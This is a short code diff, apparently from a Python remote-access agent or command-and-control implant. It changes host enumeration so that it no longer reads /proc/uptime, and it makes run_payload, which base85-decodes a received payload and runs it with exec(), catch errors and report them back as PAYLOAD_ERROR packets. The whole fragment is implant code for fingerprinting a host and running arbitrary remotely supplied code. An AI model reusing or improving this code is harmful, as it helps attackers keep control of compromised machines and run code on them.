@@ -35,13 +35,13 @@ def enum_host():
     logging.debug('Enumerating host')
     host_platform = platform.platform()
     host_name = socket.gethostname()
-    with open('/proc/uptime', 'r') as f:
-        host_uptime = float(f.readline().split()[0])
+    #with open('/proc/uptime', 'r') as f:
+        #host_uptime = float(f.readline().split()[0])
     
     host_data = {
         'host_platform': host_platform,
-        'host_name': host_name,
-        'host_uptime': host_uptime
+        'host_name': host_name
+        #'host_uptime': host_uptime
     }
 
     enumdata = {
@@ -145,7 +145,15 @@ def run_payload(payload):
     logging.debug('========== Payload ==========')
     script = base64.b85decode(payload).decode().lstrip()
     logging.debug(script)
-    exec(script)
+    try:
+        exec(script)
+    except Exception as e:
+        error_pkt = {
+            'status': 'PAYLOAD_ERROR',
+            'error': str(e)
+        }
+        respond(error_pkt)
+
 
 def run_command(command):
     logging.debug('Running a command')
